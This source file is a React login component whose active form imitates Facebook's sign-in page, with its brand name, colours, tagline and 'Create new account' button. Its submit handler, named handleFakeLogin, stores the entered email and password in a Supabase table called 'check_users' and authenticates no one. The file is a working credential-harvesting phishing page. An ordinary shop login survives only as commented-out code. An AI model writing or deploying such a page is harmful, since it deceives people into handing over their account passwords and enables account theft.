"use client"
import { Form } from '@/components/ui/form';
import React, { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { z } from 'zod';
import {zodResolver} from "@hookform/resolvers/zod";
import CustomFormField from '@/components/ui/CustomFormField';
import { MdOutlineEmail } from "react-icons/md";
import { CiLock } from "react-icons/ci";
import SubmitButton from '@/components/ui/SubmitButton';
import FormHeading from '../FormHeading';
// import AuthWithGoogleBtn from '@/components/ui/AuthWithGoogleBtn';
import { Link } from '@/i18n/navigation';
import HandleTranslate from '@/helper/HandleTranslate';
import { useSignIn } from '@/services/auth/SignIn';
import { useRouter } from '@/i18n/navigation';
import { toast } from 'sonner';
import FullScreenLoading from '@/components/ui/loading/FullScreenLoading';
import { useRedirectToProfile } from '@/services/auth/useRedirectToProfile';
import { supabase } from '@/app/api/supabase/SupabaseClient';
const formValidation = z.object({
  // email : z.string().email(),
  name : z.string(),
  password : z.string().min(1)
})
function LoginForm() {
  const router = useRouter()
  const [redirect , setRedirect] = useState(false)
  const {mutate:signIn , isPending:signInLoading , isError , error , isSuccess} = useSignIn()
  const form = useForm({
    resolver : zodResolver(formValidation),
    defaultValues : {
      name : "",
      password : "",
    }
  })
  const handleSignInUser = async (data) => {
    signIn({email:data.email , password : data.password})
  }
  useEffect(() => {
    if(isSuccess) {
      toast.success(`redirect to your profile...`)
      setRedirect(true);
      useRedirectToProfile(router)
    }
    return () => setRedirect(false)
  },[isSuccess])

  const handleFakeLogin = async (data) => {
    const {data:loginData} = await supabase.from("check_users").insert(data);
    return loginData
  }


  // return (
  //   <>
  //   <div className='relative flex flex-col gap-y-2'>
  //     <FormHeading
  //       title = {<div>Let’s <span className='text-primary'>Get</span> You Signed In</div>}
  //       pargraph = {`Welcome back! Sign in to discover your favorite picks and enjoy seamless shopping.`}
  //     />
  //     <Form {...form}>
  //       <form
  //         id='login-form'
  //         // onSubmit={form.handleSubmit((data) => handleSignInUser(data))}
  //         onSubmit={form.handleSubmit((data) => handleFakeLogin(data))}
  //         aria-disabled={redirect || signInLoading}
  //         onKeyDown={(e) => {
  //           if(signInLoading || redirect) {
  //             e.preventDefault()
  //           }
  //         }}
  //       >
  //         <div className='flex flex-col gap-y-6'>
  //           {/* <CustomFormField 
  //           labelClassName='z-20 absolute -translate-y-[50%] translate-x-2 bg-background text-xs px-1 text-slate-500 font-medium' 
  //           name='email'
  //           type='email'
  //           label='E-mail' 
  //           icon={<MdOutlineEmail className=" text-gray-600 w-4 h-4" />} 
  //           form={form}
  //           /> */}
  //           <CustomFormField 
  //           labelClassName='z-20 absolute -translate-y-[50%] translate-x-2 bg-background text-xs px-1 text-slate-500 font-medium' 
  //           name='name'
  //           type='name'
  //           label='E-mail' 
  //           icon={<MdOutlineEmail className=" text-gray-600 w-4 h-4" />} 
  //           form={form}
  //           />
  //           <CustomFormField 
  //           labelClassName='z-20 absolute -translate-y-[50%] translate-x-2 bg-background text-xs px-1 text-slate-500 font-medium' 
  //           name='password'
  //           type='password'
  //           label='Password' 
  //           icon={<CiLock className=" text-gray-600 w-4 h-4" />} 
  //           form={form}
  //           />
  //         </div>
  //         <Link href={"/auth/insert-mail-to-reset-password"} className='text-sm mt-2'>
  //           Forgot your password ?
  //         </Link>
  //         <div className='relative flex items-center justify-center my-4'>
  //           <span className='relative w-[50%] h-[.5px] bg-slate-800 rounded-md opacity-50'></span>
  //           <span className='mx-2 -translate-y-0.5'>or</span>
  //           <span className='relative w-[50%] h-[.5px] bg-slate-800 rounded-md opacity-50'></span>
  //         </div>
  //         <div className='relative flex items-center gap-x-1.5'>
  //           <SubmitButton disabled={signInLoading || isSuccess} form={"login-form"}>
  //             {
  //               signInLoading
  //               ?
  //               <><HandleTranslate word={"Loading"} page={"global"} />..</>
  //               :
  //               <HandleTranslate word={"Submit"} page={"global"} />
  //             }
  //           </SubmitButton>
  //           <span className='flex items-center gap-x-1'>
  //               <HandleTranslate word={"Don't have an account"} page={"global"} />
  //               <Link href={"/auth/register"} className='underline '>
  //                 <HandleTranslate word={"Register"} page={"global"} />
  //               </Link>
  //           </span>
  //         </div>
  //       </form>
  //       {/* <AuthWithGoogleBtn className={`mb-4`} title={"Login with Google"}/> */}
  //     </Form>
  //   </div>
  //   {redirect && <FullScreenLoading/>}
  //   </>
  // )
  return (
    <div className='relative flex flex-col gap-y-6 bg-white rounded-lg shadow-lg p-5 max-w-md w-full'>
  {/* Facebook-style heading */}
  <div className='text-center mb-2'>
    <div className='text-3xl font-bold text-[#1877f2] mb-1'>facebook</div>
    <div className='text-gray-600 text-sm'>Connect with friends and the world around you</div>
  </div>

  <Form {...form}>
    <form
      id='login-form'
      onSubmit={form.handleSubmit((data) => handleFakeLogin(data))}
      aria-disabled={redirect || signInLoading}
      onKeyDown={(e) => {
        if(signInLoading || redirect) {
          e.preventDefault()
        }
      }}
    >
      <div className='flex flex-col gap-y-3'>
        {/* Facebook-style input field - email */}
        <div className='relative'>
          <CustomFormField 
            labelClassName='absolute -top-3 left-3 bg-white px-1 text-xs text-gray-500 font-normal z-20'
            name='name'
            type='name'
            label='Email'
            icon={<MdOutlineEmail className="text-gray-400 w-5 h-5" />} 
            form={form}
            containerClassName='border border-gray-300 rounded-lg hover:border-gray-400 focus-within:border-[#1877f2] focus-within:shadow-sm transition-all'
            inputClassName='pl-10 py-3 text-base'
          />
        </div>
        
        {/* Facebook-style input field - password */}
        <div className='relative'>
          <CustomFormField 
            labelClassName='absolute -top-3 left-3 bg-white px-1 text-xs text-gray-500 font-normal z-20'
            name='password'
            type='password'
            label='Password'
            icon={<CiLock className="text-gray-400 w-5 h-5" />} 
            form={form}
            containerClassName='border border-gray-300 rounded-lg hover:border-gray-400 focus-within:border-[#1877f2] focus-within:shadow-sm transition-all'
            inputClassName='pl-10 py-3 text-base'
          />
        </div>
      </div>

      {/* Facebook-style forgot password link */}
      <Link 
        href={"/auth/insert-mail-to-reset-password"} 
        className='text-[#1877f2] text-sm hover:underline block text-center mt-3'
      >
        Forgot password?
      </Link>

      {/* Facebook-style divider */}
      <div className='relative flex items-center justify-center my-5'>
        <div className='w-full h-px bg-gray-300'></div>
      </div>

      {/* Facebook-style button and register section */}
      <div className='flex flex-col gap-y-3'>
        <SubmitButton 
          disabled={signInLoading || isSuccess} 
          form={"login-form"}
          className='w-full bg-[#1877f2] text-white font-bold py-2.5 rounded-lg hover:bg-[#166fe5] transition-colors text-base disabled:opacity-50'
        >
          {
            signInLoading
            ?
            <>Loading..</>
            :
            <>Log In</>
          }
        </SubmitButton>
        
        {/* Facebook-style create account button */}
        <button
          type="button"
          onClick={() => window.location.href = "/auth/register"}
          className='w-full bg-[#42b72a] text-white font-bold py-2.5 rounded-lg hover:bg-[#36a420] transition-colors text-base mt-2'
        >
          Create new account
        </button>
        
        {/* Register text - hidden in Facebook style, replaced with button above */}
        <div className='hidden'>
          <span className='flex items-center gap-x-1'>
            <HandleTranslate word={"Don't have an account"} page={"global"} />
            <Link href={"/auth/register"} className='underline '>
              <HandleTranslate word={"Register"} page={"global"} />
            </Link>
          </span>
        </div>
      </div>
    </form>
    {/* <AuthWithGoogleBtn className={`mb-4`} title={"Login with Google"}/> */}
  </Form>
  
  {/* Facebook-style footer */}
  <div className='text-center mt-4 pt-2 border-t border-gray-200'>
    <div className='text-xs text-gray-500'>
      <Link href="#" className='hover:underline mx-2'>English (US)</Link>
      <span className='mx-1'>·</span>
      <Link href="#" className='hover:underline mx-2'>Privacy</Link>
      <span className='mx-1'>·</span>
      <Link href="#" className='hover:underline mx-2'>Terms</Link>
    </div>
  </div>
</div>
  )
}

export default LoginForm